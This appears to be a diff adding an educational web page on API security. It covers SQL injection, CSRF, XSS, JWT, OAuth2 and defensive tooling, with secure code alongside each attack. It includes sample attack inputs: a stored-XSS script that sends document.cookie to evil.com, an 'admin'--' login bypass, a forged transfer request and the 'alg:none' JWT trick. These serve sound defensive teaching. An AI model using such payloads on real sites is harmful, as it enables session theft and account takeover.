+        </div>
+        <div class="vis-body">
+          <div class="sql-cmp">
+            <div class="sql-row sql-bad">
+              <div class="sql-rlabel">❌ Vulnerable — String Concatenation</div>
+              <div class="sql-code">
+                <div><span style="color:var(--muted)">// username: admin'--</span></div>
+                <div><span style="color:var(--blue)">const</span> q = <span style="color:var(--amber)">`SELECT * FROM users</span></div>
+                <div><span style="color:var(--amber)">&nbsp;WHERE user='${username}'</span></div>
+                <div><span style="color:var(--amber)">&nbsp;AND pass='${password}'`</span>;</div>
+                <br>
+                <div style="color:var(--red)">// Becomes:</div>
+                <div style="color:var(--red)">SELECT * FROM users WHERE</div>
+                <div style="color:var(--red)">user='admin'--' AND pass='x'</div>
+                <div style="color:var(--red)">// Auth bypassed ✓ (for attacker)</div>
+              </div>
+            </div>
+            <div class="sql-row sql-good">
+              <div class="sql-rlabel">✅ Secure — Parameterized Query</div>
+              <div class="sql-code">
+                <div><span style="color:var(--muted)">// Input treated as pure data</span></div>
+                <div><span style="color:var(--blue)">const</span> q = <span style="color:var(--safe)">'SELECT * FROM users</span></div>
+                <div><span style="color:var(--safe)">&nbsp;WHERE user=? AND pass=?'</span>;</div>
+                <br>
+                <div>db.<span style="color:var(--purple)">execute</span>(q, [username, hashedPw]);</div>
+                <div style="color:var(--safe)">// Injection impossible — params escaped</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="code-block" style="margin-top:1rem;">
+            <div class="cb-head">
+              <span class="cb-lang">Prisma ORM (TypeScript)</span>
+              <span class="cb-tag tag-good">✓ Safe by default</span>
+            </div>
+            <div class="cb-body">
+              <div><span class="cc">// Prisma parameterizes automatically</span></div>
+              <div><span class="ck">const</span> user = <span class="ck">await</span> prisma.user.<span class="cf">findUnique</span>({</div>
+              <div>&nbsp;&nbsp;where: { email: userInput.email }</div>
+              <div>});</div>
+              <br>
+              <div><span class="cc">// Raw queries — use tagged template</span></div>
+              <div><span class="ck">const</span> res = <span class="ck">await</span> prisma.</div>
+              <div>&nbsp;&nbsp;$queryRaw<span class="cs">`SELECT * FROM users</span></div>
+              <div><span class="cs">&nbsp;&nbsp;WHERE id = ${userId}`</span>; <span class="cc">// Safe ✓</span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ CSRF ══════════════════════════════════════ -->
+<section class="section section-dark" id="csrf">
+  <div class="two-col flip">
+    <div>
+      <div class="sec-num">// AREA 04 — SESSION WEAPONIZATION</div>
+      <div class="t-badge badge-purple">🎭 The Hijacked Session: CSRF</div>
+      <h2 class="topic-title reveal">Cross-Site Request<br>Forgery</h2>
+      <p class="topic-sub reveal">Cross-Site Request Forgery makes a victim's browser your unwitting accomplice — performing unauthorized actions as if they chose to.</p>
+      <p class="topic-body reveal">CSRF exploits trust. Browsers automatically attach cookies to every request — including cross-origin ones. An attacker's page can silently POST to your API using the victim's authenticated session. No credentials needed. No user awareness. State-changing actions — transfers, password changes, email updates — all at risk.</p>
+
+      <div class="flow reveal">
+        <div class="flow-label">⚔ Forged Request Chain</div>
+        <div class="flow-step" data-n="1" style="--step-c:var(--blue)"><strong>Victim authenticated</strong> — logged into bank.com, session cookie <code style="color:var(--amber)">session=abc123</code> stored</div>
+        <div class="flow-step" data-n="2" style="--step-c:var(--amber)"><strong>Attacker lures victim</strong> — phishing email: "Your account needs verification" → evil.com</div>
+        <div class="flow-step" data-n="3" style="--step-c:var(--red)"><strong>Hidden form fires</strong> — <code style="color:var(--red)">POST /transfer?to=attacker&amt=9999</code> auto-submitted on page load</div>
+        <div class="flow-step" data-n="4" style="--step-c:var(--red)"><strong>Bank processes it</strong> — sees valid session cookie, executes transfer, victim none the wiser</div>
+      </div>
+
+      <div class="cards-2 reveal">
+        <div class="mini-card">
+          <div class="mini-card-t">🛡 Defenses</div>
+          <ul>
+            <li>Synchronizer token pattern</li>
+            <li>SameSite=Strict on cookies</li>
+            <li>Double-submit cookie</li>
+            <li>Verify Origin/Referer header</li>
+            <li>Re-auth for sensitive ops</li>
+          </ul>
+        </div>
+        <div class="mini-card">
+          <div class="mini-card-t">📋 Disable Cookies</div>
+          <ul>
+            <li>Securely set HttpOnly</li>
+            <li>Set Secure flag (HTTPS)</li>
+            <li>SameSite=Lax minimum</li>
+            <li class="warn">SameSite=None → risk</li>
+            <li class="neg">withCredentials=true → audit</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="rw-box reveal">
+        <div class="rw-label">Real-World Breach</div>
+        <div class="rw-text"><strong>Netflix 2006</strong> — CSRF allowed attackers to change victim email/password and hijack accounts. <strong>YouTube 2008</strong> — mass-subscribe and auto-favorite attacks affected millions of accounts before the CSRF token fix was deployed. Both required zero victim interaction beyond clicking a link.</div>
+      </div>
+    </div>
+
+    <div class="reveal reveal-d2">
+      <div class="vis-panel">
+        <div class="vis-head">
+          <span>🎭</span>
+          <span class="vis-title">CSRF Attack Diagram</span>
+          <span class="vis-badge tag-bad">⚠ High Risk</span>
+        </div>
+        <div class="vis-body">
+          <div class="csrf-actor">
+            <div class="aicon ai-v">👤</div>
+            <div>
+              <div class="aname">Victim</div>
+              <div class="adesc">Authenticated at bank.com · Cookie: session=abc123</div>
+            </div>
+          </div>
+          <div class="csrf-arrow">↓ Clicks phishing link</div>
+          <div class="csrf-actor">
+            <div class="aicon ai-a">🦹</div>
+            <div>
+              <div class="aname">evil.com</div>
+              <div class="adesc">Hidden form: POST /api/transfer?to=attacker&amt=9999</div>
+            </div>
+          </div>
+          <div class="csrf-arrow">↓ Browser sends request WITH victim's cookie (auto)</div>
+          <div class="csrf-actor">
+            <div class="aicon ai-s">🏦</div>
+            <div>
+              <div class="aname">bank.com API</div>
+              <div class="adesc">Valid session detected → Transfer approved → $9,999 gone</div>
+            </div>
+          </div>
+
+          <div class="code-block" style="margin-top:1rem;">
+            <div class="cb-head">
+              <span class="cb-lang">Express + csurf middleware</span>
+              <span class="cb-tag tag-good">✓ Protected</span>
+            </div>
+            <div class="cb-body">
+              <div><span class="cc">// Generate unique token per session</span></div>
+              <div>app.<span class="cf">use</span>(<span class="cf">csrf</span>({ cookie: <span class="ck">true</span> }));</div>
+              <br>
+              <div>app.<span class="cf">get</span>(<span class="cs">'/api/form-token'</span>, (req, res) => {</div>
+              <div>&nbsp;&nbsp;res.<span class="cf">json</span>({ _csrf: req.<span class="cf">csrfToken</span>() });</div>
+              <div>});</div>
+              <br>
+              <div><span class="cc">// Cookies: SameSite=Strict</span></div>
+              <div>res.<span class="cf">cookie</span>(<span class="cs">'session'</span>, token, {</div>
+              <div>&nbsp;&nbsp;sameSite: <span class="cs">'Strict'</span>,</div>
+              <div>&nbsp;&nbsp;httpOnly: <span class="ck">true</span>, secure: <span class="ck">true</span></div>
+              <div>});</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ XSS ═══════════════════════════════════════ -->
+<section class="section" id="xss">
+  <div class="two-col">
+    <div>
+      <div class="sec-num">// AREA 05 — SCRIPT INJECTION</div>
+      <div class="t-badge badge-red">⚡ The Trojan Script: XSS</div>
+      <h2 class="topic-title reveal">Injecting Code That<br>Runs in Every Browser</h2>
+      <p class="topic-sub reveal">XSS turns your trusted website into a malware delivery platform — running attacker scripts in your users' browsers with full page privileges.</p>
+      <p class="topic-body reveal">Cross-Site Scripting injects malicious JavaScript into pages served to other users. Stored XSS persists in your database and fires for every visitor. Reflected XSS executes from URL parameters. DOM-based XSS manipulates client-side sinks. All three steal session cookies, log keystrokes, redirect users, and perform actions on victims' behalf — silently.</p>
+
+      <div class="flow reveal">
+        <div class="flow-label">⚔ Stored XSS Attack</div>
+        <div class="flow-step" data-n="1" style="--step-c:var(--red)"><strong>Attacker posts comment</strong> — <code style="color:var(--amber)">&lt;script&gt;fetch('evil.com?c='+document.cookie)&lt;/script&gt;</code></div>
+        <div class="flow-step" data-n="2" style="--step-c:var(--amber)"><strong>Stored without sanitization</strong> — raw HTML saved to database, no encoding applied</div>
+        <div class="flow-step" data-n="3" style="--step-c:var(--red)"><strong>Every visitor triggers it</strong> — browser executes the script, session cookies exfiltrated to attacker</div>
+        <div class="flow-step" data-n="4" style="--step-c:var(--red)"><strong>Account takeover</strong> — attacker uses stolen cookies to impersonate victims, no password needed</div>
+      </div>
+
+      <div class="cards-2 reveal">
+        <div class="mini-card">
+          <div class="mini-card-t">🛡 Defenses</div>
+          <ul>
+            <li>Output encoding (always)</li>
+            <li>Content-Security-Policy header</li>
+            <li>DOMPurify for HTML input</li>
+            <li>HttpOnly cookie flag</li>
+            <li>Trusted Types API (Chrome)</li>
+          </ul>
+        </div>
+        <div class="mini-card">
+          <div class="mini-card-t">🔍 XSS Types</div>
+          <ul>
+            <li>Stored (Persistent)</li>
+            <li>Reflected (Non-persistent)</li>
+            <li>DOM-based (Client-side)</li>
+            <li class="neg">Blind XSS (hardest to catch)</li>
+            <li class="warn">Mutation XSS (mXSS)</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="rw-box reveal">
+        <div class="rw-label">Real-World Breach</div>
+        <div class="rw-text"><strong>Samy Worm 2005</strong> — first XSS worm spread across MySpace to 1M profiles in 24 hours. <strong>Twitter StalkScan 2010</strong> — stored XSS in tweet content propagated virally affecting thousands of accounts. <strong>British Airways 2018</strong> — DOM-based XSS in checkout page used for 15-day Magecart payment skimming.</div>
+      </div>
+    </div>
+
+    <div class="reveal reveal-d2">
+      <div class="vis-panel">
+        <div class="vis-head">
+          <span>⚡</span>
+          <span class="vis-title">XSS Injection Sandbox</span>
+          <span class="vis-badge tag-bad">🔴 Critical</span>
+        </div>
+        <div class="vis-body">
+          <div style="font-size:.65rem;color:var(--muted);margin-bottom:.65rem;">Enter user input — see how unsafe rendering behaves:</div>
+          <input class="xss-input" id="xssIn" value="<script>alert('XSS hijack!')</script>">
+          <div class="xss-controls">
+            <button class="xss-btn-bad" onclick="xssDemo(false)">⚡ Unsafe Render</button>
+            <button class="xss-btn-safe" onclick="xssDemo(true)">🛡 Safe Render</button>
+          </div>
+          <div class="xss-out" id="xssOut"><span style="color:var(--muted)">Output renders here...</span></div>
+          <div class="xss-warn" id="xssWarn" style="display:none">🚨 XSS payload detected! In production this script would execute in every visitor's browser, stealing session cookies and credentials.</div>
+
+          <div class="code-block" style="margin-top:1rem;">
+            <div class="cb-head">
+              <span class="cb-lang">JavaScript + DOMPurify</span>
+              <span class="cb-tag tag-good">✓ Sanitized</span>
+            </div>
+            <div class="cb-body">
+              <div><span class="ck">import</span> DOMPurify <span class="ck">from</span> <span class="cs">'dompurify'</span>;</div>
+              <br>
+              <div><span class="cc">// Sanitize before DOM insertion</span></div>
+              <div><span class="ck">const</span> clean = DOMPurify.<span class="cf">sanitize</span>(userInput, {</div>
+              <div>&nbsp;&nbsp;ALLOWED_TAGS: [<span class="cs">'b'</span>, <span class="cs">'i'</span>, <span class="cs">'em'</span>],</div>
+              <div>&nbsp;&nbsp;ALLOWED_ATTR: [],</div>
+              <div>});</div>
+              <div>el.innerHTML = clean; <span class="cc">// Safe ✓</span></div>
+              <br>
+              <div><span class="cc">// Set CSP header on every response</span></div>
+              <div><span class="cn">"Content-Security-Policy: "</span></div>
+              <div><span class="cn">"default-src 'self'; script-src 'self'"</span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ JWT ═══════════════════════════════════════ -->
+<section class="section section-alt" id="jwt">
+  <div class="two-col flip">
+    <div>
+      <div class="sec-num">// AREA 06 — TOKEN SECURITY</div>
+      <div class="t-badge badge-teal">🔑 The Digital Passport: JWT</div>
+      <h2 class="topic-title reveal">JSON Web Tokens —<br>The Right Way</h2>
+      <p class="topic-sub reveal">JWTs are the digital passport to accessing countless services without re-submitting credentials. A stolen or forged passport is as dangerous as no security at all.</p>
+      <p class="topic-body reveal">JWT vulnerabilities include: algorithm confusion attacks (<code style="color:var(--amber)">alg:none</code> bypass), weak signing secrets brutable in minutes, missing claim validation (exp, iss, aud), and tokens stored insecurely in localStorage (XSS vector). A properly implemented JWT is powerful — an improperly implemented one is a backdoor.</p>
+
+      <div class="flow reveal">
+        <div class="flow-label">⚔ Common JWT Attack Vectors</div>
+        <div class="flow-step" data-n="1" style="--step-c:var(--red)"><strong>Algorithm confusion</strong> — attacker changes header to <code style="color:var(--amber)">"alg":"none"</code>, removes signature, server accepts if not validated</div>
+        <div class="flow-step" data-n="2" style="--step-c:var(--red)"><strong>Weak secret brute-forced</strong> — <code style="color:var(--amber)">jwt.secret</code> or <code style="color:var(--amber)">password123</code> cracked offline with hashcat in seconds</div>
+        <div class="flow-step" data-n="3" style="--step-c:var(--amber)"><strong>Missing exp validation</strong> — token never expires, stolen token grants permanent access</div>
+        <div class="flow-step" data-n="4" style="--step-c:var(--amber)"><strong>localStorage exposure</strong> — token readable by any JS on the page, XSS extracts it instantly</div>
+      </div>
+
+      <div class="cards-2 reveal">
+        <div class="mini-card">
+          <div class="mini-card-t">🛡 Secure JWT Checklist</div>
+          <ul>
+            <li>Use RS256 (asymmetric) in prod</li>
+            <li>Validate alg, exp, iss, aud</li>
+            <li>Whitelist allowed algorithms</li>
+            <li>Store in HttpOnly cookie</li>
+            <li>Implement token revocation list</li>
+          </ul>
+        </div>
+        <div class="mini-card">
+          <div class="mini-card-t">⚠ Common Mistakes</div>
+          <ul>
+            <li class="neg">alg:none not blocked</li>
+            <li class="neg">HS256 with weak secret</li>
+            <li class="neg">Storing in localStorage</li>
+            <li class="warn">No exp claim set</li>
+            <li class="warn">Trusting JWT header alg</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="rw-box reveal">
+        <div class="rw-label">Real-World Exploit</div>
+        <div class="rw-text"><strong>Auth0 2016</strong> — a critical algorithm confusion vulnerability allowed attackers to sign arbitrary JWTs using the public key as an HMAC secret. Any RS256 service could be completely bypassed. The fix: always specify and enforce algorithm in server-side verification, never trust the token's own alg header.</div>
+      </div>
+    </div>
+
+    <div class="reveal reveal-d2">
+      <div class="vis-panel">
+        <div class="vis-head">
+          <span>🔑</span>
+          <span class="vis-title">JWT Structure Inspector</span>
+          <span class="vis-badge tag-good">AUTHENTICATED</span>
+        </div>
+        <div class="vis-body">
+          <div class="jwt-parts">
+            <div class="jwt-part jp-head">
+              <div class="jp-label">Header — Algorithm & Type</div>
+              <div class="jp-content">{ "alg": "RS256", "typ": "JWT" }<br><span style="color:var(--safe)">✓ Asymmetric — public key verifiable</span></div>
+            </div>
+            <div class="jwt-part jp-pay">
+              <div class="jp-label">Payload — Claims</div>
+              <div class="jp-content">
+                { "sub": "user_abc123",<br>
+                &nbsp;&nbsp;"iss": "https://auth.yourco.com",<br>
+                &nbsp;&nbsp;"aud": "https://api.yourco.com",<br>
+                &nbsp;&nbsp;"exp": 1735689600, <span style="color:var(--safe)">← Validate!</span><br>
+                &nbsp;&nbsp;"iat": 1735686000 }
+              </div>
+            </div>
+            <div class="jwt-part jp-sig">
+              <div class="jp-label">Signature — RS256 signed</div>
+              <div class="jp-content">RSASHA256(base64(header) + "." + base64(payload), privateKey)<br><span style="color:var(--safe)">✓ Cannot be forged without private key</span></div>
+            </div>
+          </div>
+
+          <div class="code-block">
+            <div class="cb-head">
+              <span class="cb-lang">Node.js / jsonwebtoken</span>
+              <span class="cb-tag tag-good">✓ Secure</span>
+            </div>
+            <div class="cb-body">
+              <div><span class="cc">// ALWAYS whitelist algorithms</span></div>
+              <div><span class="ck">const</span> payload = jwt.<span class="cf">verify</span>(token, publicKey, {</div>
+              <div>&nbsp;&nbsp;algorithms: [<span class="cs">'RS256'</span>], <span class="cc">// whitelist!</span></div>
+              <div>&nbsp;&nbsp;issuer: <span class="cs">'https://auth.yourco.com'</span>,</div>
+              <div>&nbsp;&nbsp;audience: <span class="cs">'https://api.yourco.com'</span>,</div>
+              <div>});</div>
+              <div><span class="cc">// Never: jwt.verify(token, secret)</span></div>
+              <div><span class="cc">// without algorithms option ↑</span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ OAUTH2 ════════════════════════════════════ -->
+<section class="section section-dark" id="oauth">
+  <div class="two-col">
+    <div>
+      <div class="sec-num">// AREA 07 — DELEGATION PROTOCOL</div>
+      <div class="t-badge badge-teal">🔐 The Sovereign Key: OAuth2 & OIDC</div>
+      <h2 class="topic-title reveal">Delegate Access<br>Without Sharing Passwords</h2>
+      <p class="topic-sub reveal">OAuth2 allows you to share more or less access across services without ever revealing your own passwords — if implemented correctly. Why OIDC adds identity verification on top.</p>
+      <p class="topic-body reveal">OAuth2 is an authorization framework; OIDC (OpenID Connect) extends it with identity. Together they power "Login with Google/GitHub." Misconfigurations — open redirects, PKCE bypass, state parameter omission, token leakage in URLs — can lead to complete account takeover. Always use PKCE, validate state, and check token audience.</p>
+
+      <div class="cards-2 reveal">
+        <div class="mini-card">
+          <div class="mini-card-t">🔓 Access Scopes</div>
+          <ul>
+            <li>read:profile (minimal)</li>
+            <li>write:posts (specific)</li>
+            <li>admin:org (privileged)</li>
+            <li class="warn">offline_access (long-lived)</li>
+            <li class="neg">* (never grant wildcard)</li>
+          </ul>
+        </div>
+        <div class="mini-card">
+          <div class="mini-card-t">⚠ Critical Mistakes</div>
+          <ul>
+            <li class="neg">Missing state parameter</li>
+            <li class="neg">Open redirect in redirect_uri</li>
+            <li class="neg">PKCE not enforced</li>
+            <li class="warn">Token in URL fragment</li>
+            <li class="warn">No scope restriction</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="rw-box reveal">
+        <div class="rw-label">Real-World Exploit</div>
+        <div class="rw-text"><strong>Facebook 2018 (50M accounts)</strong> — OAuth token theft via a "View As" feature combined with three separate bugs allowed attackers to harvest access tokens. The absence of binding tokens to client state made mass harvesting possible. Always bind tokens to device fingerprint and validate redirect_uri exactly.</div>
+      </div>
+    </div>
+
+    <div class="reveal reveal-d2">
+      <div class="vis-panel">
+        <div class="vis-head">
+          <span>🔐</span>
+          <span class="vis-title">OAuth2 PKCE Flow</span>
+          <span class="vis-badge tag-good">✓ Secure Flow</span>
+        </div>
+        <div class="vis-body">
+          <div class="oauth-flow">
+            <div class="of-step"><div class="of-num">1</div><span class="of-text"><strong>App generates</strong> code_verifier (random 43-128 char string) + code_challenge (SHA256 hash)</span></div>
+            <div class="of-step"><div class="of-num">2</div><span class="of-text"><strong>Auth request sent</strong> with code_challenge, state (CSRF protection), scope</span></div>
+            <div class="of-step"><div class="of-num">3</div><span class="of-text"><strong>User authenticates</strong> at Authorization Server — grants permission</span></div>
+            <div class="of-step"><div class="of-num">4</div><span class="of-text"><strong>Auth code returned</strong> to redirect_uri — state validated server-side</span></div>
+            <div class="of-step"><div class="of-num">5</div><span class="of-text"><strong>Token exchange</strong> — code + code_verifier sent — server verifies PKCE, issues tokens</span></div>
+          </div>
+
+          <div class="code-block" style="margin-top:1rem;">
+            <div class="cb-head">
+              <span class="cb-lang">Node.js PKCE Generation</span>
+              <span class="cb-tag tag-good">✓ RFC 7636</span>
+            </div>
+            <div class="cb-body">
+              <div><span class="ck">import</span> { randomBytes, createHash } <span class="ck">from</span> <span class="cs">'crypto'</span>;</div>
+              <br>
+              <div><span class="ck">const</span> verifier = randomBytes(<span class="cn">32</span>).<span class="cf">toString</span>(<span class="cs">'base64url'</span>);</div>
+              <div><span class="ck">const</span> challenge = <span class="cf">createHash</span>(<span class="cs">'sha256'</span>)</div>
+              <div>&nbsp;&nbsp;.<span class="cf">update</span>(verifier).<span class="cf">digest</span>(<span class="cs">'base64url'</span>);</div>
+              <br>
+              <div><span class="cc">// Validate redirect_uri exactly</span></div>
+              <div><span class="ck">const</span> validUris = [<span class="cs">'https://app.co/callback'</span>];</div>
+              <div><span class="ck">if</span> (!validUris.<span class="cf">includes</span>(redirectUri))</div>
+              <div>&nbsp;&nbsp;<span class="ck">throw</span> <span class="ck">new</span> Error(<span class="cs">'Invalid redirect_uri'</span>);</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ COMMAND CENTER ════════════════════════════ -->
+<section class="section" id="command">
+  <div class="blob" style="width:500px;height:500px;background:rgba(0,200,160,.03);top:50px;right:-150px;" data-parallax="0.08"></div>
+  <div class="sec-num">// AREA 08 — STRATEGIC DEFENSE</div>
+  <h2 class="sec-title reveal">The Command Center</h2>
+  <p class="sec-subtitle reveal">The API Gateway of defense tools — the single knife that tools all other API traffic, controls and monitors your entire perimeter.</p>
+
+  <div class="cmd-layout">
+    <div>
+      <div style="background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1.5rem;margin-bottom:1.25rem;" class="reveal">
+        <div style="font-family:var(--fw);font-weight:700;font-size:.85rem;margin-bottom:1rem;color:var(--teal);">🛡 Strategic Edge Defense</div>
+        <div style="font-size:.72rem;color:#7a8aaa;line-height:1.8;margin-bottom:1rem;">Deploy defense in depth — never rely on a single control. Layer your security from network edge to application code.</div>
+        <div class="checklist">
+          <div class="ci"><span class="ci-icon">🌐</span>API Gateway (Kong, AWS API GW) — centralized auth, rate limiting, request validation</div>
+          <div class="ci"><span class="ci-icon">🔥</span>WAF (Cloudflare, AWS WAF) — block SQLi, XSS, known exploit patterns at the edge</div>
+          <div class="ci"><span class="ci-icon">🔒</span>mTLS between microservices — zero-trust service-to-service authentication</div>
+          <div class="ci"><span class="ci-icon">🔑</span>Secrets Manager (Vault, AWS SM) — never hardcode credentials</div>
+          <div class="ci"><span class="ci-icon">📊</span>Distributed tracing (Jaeger, OTEL) — correlate request paths across services</div>
+        </div>
+      </div>
+
+      <div style="background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1.5rem;" class="reveal">
+        <div style="font-family:var(--fw);font-weight:700;font-size:.85rem;margin-bottom:.85rem;">Live Security Metrics</div>
+        <div class="metric-row"><span class="mr-name">Requests / min</span><span class="mr-val">48,203</span></div>
+        <div class="metric-row"><span class="mr-name">Blocked by WAF</span><span class="mr-val red">1,247</span></div>
+        <div class="metric-row"><span class="mr-name">Rate limited</span><span class="mr-val amber">382</span></div>
+        <div class="metric-row"><span class="mr-name">Auth failures</span><span class="mr-val red">89</span></div>
+        <div class="metric-row"><span class="mr-name">Avg response time</span><span class="mr-val">42ms</span></div>
+        <div class="metric-row"><span class="mr-name">Uptime</span><span class="mr-val">99.98%</span></div>
+      </div>
+    </div>
+
+    <div class="reveal reveal-d2">
+      <div class="log-stream">
+        <div><span class="log-time">10:42:01</span><span class="log-ok">[PASS]</span> GET /api/users/me — 200 — user_abc123</div>
+        <div><span class="log-time">10:42:02</span><span class="log-err">[BLOCK]</span> POST /api/login — 429 — IP 45.33.32.156 rate limited</div>
+        <div><span class="log-time">10:42:03</span><span class="log-warn">[WARN]</span> GET /api/users/199 — IDOR attempt detected, user_xyz789</div>
+        <div><span class="log-time">10:42:04</span><span class="log-ok">[PASS]</span> POST /api/transfer — 200 — CSRF token valid ✓</div>
+        <div><span class="log-time">10:42:05</span><span class="log-err">[BLOCK]</span> WAF — SQLi pattern in query param: <span style="color:var(--red)">id=1' OR '1'='1</span></div>
+        <div><span class="log-time">10:42:06</span><span class="log-ok">[PASS]</span> GET /api/products — 200 — cache hit</div>
+        <div><span class="log-time">10:42:07</span><span class="log-err">[BLOCK]</span> XSS payload in comment body — sanitizer triggered</div>
+        <div><span class="log-time">10:42:08</span><span class="log-warn">[WARN]</span> JWT exp claim near expiry — user_def456</div>
+        <div><span class="log-time">10:42:09</span><span class="log-ok">[PASS]</span> CORS preflight — origin: app.yourco.com ✓</div>
+        <div><span class="log-time">10:42:10</span><span class="log-err">[BLOCK]</span> CORS — origin: evil-scraper.com ✗ blocked</div>
+        <div><span class="log-time">10:42:11</span><span class="log-ok">[PASS]</span> POST /api/data — mTLS handshake OK — service_payments</div>
+        <div><span class="log-time">10:42:12</span><span class="log-err">[ALERT]</span> Anomaly: 500 req/s spike from ASN 12345 — DDoS signature</div>
+        <div><span class="log-time">10:42:13</span><span class="log-ok">[PASS]</span> OAuth2 token exchange — PKCE verified — user_ghi789</div>
+      </div>
+
+      <div class="code-block" style="margin-top:1.25rem;">
+        <div class="cb-head">
+          <span class="cb-lang">OpenTelemetry + Node.js</span>
+          <span class="cb-tag tag-good">✓ Observability</span>
+        </div>
+        <div class="cb-body">
+          <div><span class="ck">import</span> { trace, metrics } <span class="ck">from</span> <span class="cs">'@opentelemetry/api'</span>;</div>
+          <br>
+          <div><span class="ck">const</span> tracer = trace.<span class="cf">getTracer</span>(<span class="cs">'api-security'</span>);</div>
+          <div><span class="ck">const</span> span = tracer.<span class="cf">startSpan</span>(<span class="cs">'auth.verify'</span>);</div>
+          <div>span.<span class="cf">setAttribute</span>(<span class="cs">'user.id'</span>, userId);</div>
+          <div>span.<span class="cf">setAttribute</span>(<span class="cs">'auth.method'</span>, <span class="cs">'jwt'</span>);</div>
+          <br>
+          <div><span class="cc">// Record security events</span></div>
+          <div><span class="ck">const</span> authFailures = metrics</div>
+          <div>&nbsp;&nbsp;.<span class="cf">getMeter</span>(<span class="cs">'security'</span>)</div>
+          <div>&nbsp;&nbsp;.<span class="cf">createCounter</span>(<span class="cs">'auth.failures'</span>);</div>
+          <div>authFailures.<span class="cf">add</span>(<span class="cn">1</span>, { reason: <span class="cs">'invalid_token'</span> });</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ BEST PRACTICES ════════════════════════════ -->
+<section class="section section-dark" id="practices">
+  <div class="sec-num">// FINAL AUDIT — PRODUCTION CHECKLIST</div>
+  <h2 class="sec-title reveal">Security Best<br>Practices Checklist</h2>
+  <p class="sec-subtitle reveal">Battle-tested principles that secure teams embed into every API from day one. Not bolted on after a breach — built in from commit one.</p>
+
+  <div class="prac-grid">
+    <div class="prac-card reveal" style="--pc:var(--teal)">
+      <div class="pnum">01</div>
+      <div class="picon">🔒</div>
+      <div class="ptitle">Security Headers on Every Response</div>
+      <div class="pbody">Every API response must include CSP, HSTS, X-Content-Type-Options, X-Frame-Options, Referrer-Policy, and Permissions-Policy. Use Helmet.js for Express, SecureHeaders for Python. Audit with securityheaders.com on every deploy.</div>
+      <div class="ptags"><span class="ptag">Helmet.js</span><span class="ptag">CSP</span><span class="ptag">HSTS</span><span class="ptag">securityheaders.com</span></div>
+    </div>
+    <div class="prac-card reveal reveal-d1" style="--pc:var(--blue)">
+      <div class="pnum">02</div>
+      <div class="picon">✅</div>
+      <div class="ptitle">Schema-First Input Validation</div>
+      <div class="pbody">Validate every incoming field against a strict schema — types, ranges, formats, maximum lengths. Reject malformed requests at the gateway with 400 errors before they touch business logic. Use Zod (TypeScript), Joi, or JSON Schema + ajv.</div>
+      <div class="ptags"><span class="ptag">Zod</span><span class="ptag">Joi</span><span class="ptag">ajv</span><span class="ptag">JSON Schema</span></div>
+    </div>
+    <div class="prac-card reveal reveal-d2" style="--pc:var(--purple)">
+      <div class="pnum">03</div>
+      <div class="picon">🔑</div>
+      <div class="ptitle">Secrets Management — Zero Hardcoding</div>
+      <div class="pbody">Never commit secrets. Use environment variables for dev, and a proper secrets manager (HashiCorp Vault, AWS Secrets Manager, Doppler) for production. Rotate credentials on a schedule, immediately after any suspected compromise, and on team member offboarding.</div>
+      <div class="ptags"><span class="ptag">Vault</span><span class="ptag">AWS SM</span><span class="ptag">Doppler</span><span class="ptag">git-secrets</span></div>
+    </div>
+    <div class="prac-card reveal" style="--pc:var(--amber)">
+      <div class="pnum">04</div>
+      <div class="picon">🏗</div>
+      <div class="ptitle">Least Privilege Everywhere</div>
+      <div class="pbody">Every service, DB account, IAM role, and API key gets the minimum permissions for its specific function — nothing more. Scope OAuth tokens by resource and action. Run regular permission audits. Least privilege is the single highest-ROI security control.</div>
+      <div class="ptags"><span class="ptag">RBAC</span><span class="ptag">ABAC</span><span class="ptag">IAM</span><span class="ptag">OAuth Scopes</span></div>
+    </div>
+    <div class="prac-card reveal reveal-d1" style="--pc:var(--safe)">
+      <div class="pnum">05</div>
+      <div class="picon">🔍</div>
+      <div class="ptitle">Security Testing in CI/CD</div>
+      <div class="pbody">Integrate SAST (Semgrep, CodeQL), DAST (OWASP ZAP, Burp Suite API), and SCA (Snyk, Dependabot) into your pipeline. Block deploys on critical findings. Run pen tests quarterly. Security must be automated — manual reviews alone don't scale.</div>
+      <div class="ptags"><span class="ptag">Semgrep</span><span class="ptag">OWASP ZAP</span><span class="ptag">Snyk</span><span class="ptag">CodeQL</span></div>
+    </div>
+    <div class="prac-card reveal reveal-d2" style="--pc:var(--red)">
+      <div class="pnum">06</div>
+      <div class="picon">📋</div>
+      <div class="ptitle">Incident Response Runbooks</div>
+      <div class="pbody">Define your runbooks before you need them. Who's on-call? What's the containment protocol? How do you communicate? Practice tabletop exercises quarterly. A rehearsed team responds in minutes — not days. That gap is millions of dollars and regulatory consequences.</div>
+      <div class="ptags"><span class="ptag">PagerDuty</span><span class="ptag">Runbooks</span><span class="ptag">Post-mortems</span></div>
+    </div>
+  </div>
+
+  <!-- Additional topic cards -->
+  <div style="margin-top:2.5rem;">
+    <div class="sec-num" style="margin-top:1rem;">// EXTENDED COVERAGE</div>
+    <h3 style="font-family:var(--fw);font-size:1.5rem;font-weight:800;letter-spacing:-0.02em;margin:1rem 0 .5rem;">More Security Domains</h3>
+  </div>
+  <div class="add-grid">
+    <div class="add-card reveal">
+      <div class="add-top">
+        <div class="add-icon">🎯</div>
+        <div class="t-badge badge-red" style="margin:0">IDOR</div>
+      </div>
+      <div class="add-title">Insecure Direct Object References</div>
+      <div class="add-body">Changing /api/users/123 to /api/users/124 shouldn't expose another user's data. Always verify object ownership server-side, not just authentication. Use UUIDs, implement ABAC, and log all access attempts.</div>
+      <ul class="add-tips">
+        <li>Verify ownership on every request</li>
